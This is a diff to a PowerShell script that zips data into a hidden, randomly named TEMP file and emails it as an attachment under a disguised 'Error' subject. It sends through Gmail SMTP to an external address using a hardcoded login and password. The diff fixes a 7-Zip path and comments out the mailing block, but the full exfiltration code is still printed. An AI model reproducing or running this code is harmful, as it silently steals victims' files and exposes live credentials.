@@ -5,7 +5,7 @@ $e=""
 
 
 $p=$env:TEMP+"\d"+(Get-Random -max 17071707)+".zip"
-if(Test-Path -Path "C:\Program Files\7-Zip2222\7z.exe")
+if(Test-Path -Path "C:\Program Files\7-Zip\7z.exe")
   {Set-Location -Path "C:\Program Files\7-Zip\";$arh="7-Zip"}
 else
   {$arh="WinRar"}
@@ -108,14 +108,14 @@ else
 
 attrib +H $p
 
-$SMTPServer="smtp.gmail.com";$SMTPInfo=New-Object Net.Mail.SmtpClient($SmtpServer,587);$SMTPInfo.EnableSsl=$true
-$SMTPInfo.Credentials=New-Object System.Net.NetworkCredential("f7swwq@gmail.com","parampam1");$ReportEmail=New-Object System.Net.Mail.MailMessage
+# $SMTPServer="smtp.gmail.com";$SMTPInfo=New-Object Net.Mail.SmtpClient($SmtpServer,587);$SMTPInfo.EnableSsl=$true
+# $SMTPInfo.Credentials=New-Object System.Net.NetworkCredential("f7swwq@gmail.com","parampam1");$ReportEmail=New-Object System.Net.Mail.MailMessage
 
-$ReportEmail.From="f7swwq@gmail.com";$ReportEmail.To.Add("keklol2045@gmail.com");$ReportEmail.Subject="Error: "+$e
-$s=New-Object Net.Mail.Attachment($p);
-if("WinRAR"-in $arh)
-  {$ReportEmail.Attachments.Add($s)}
-else
-  {$ReportEmail.Attachments.Add($s)};
-$SMTPInfo.Send($ReportEmail)
+# $ReportEmail.From="f7swwq@gmail.com";$ReportEmail.To.Add("keklol2045@gmail.com");$ReportEmail.Subject="Error: "+$e
+# $s=New-Object Net.Mail.Attachment($p);
+# if("WinRAR"-in $arh)
+#   {$ReportEmail.Attachments.Add($s)}
+# else
+#   {$ReportEmail.Attachments.Add($s)};
+# $SMTPInfo.Send($ReportEmail)
 
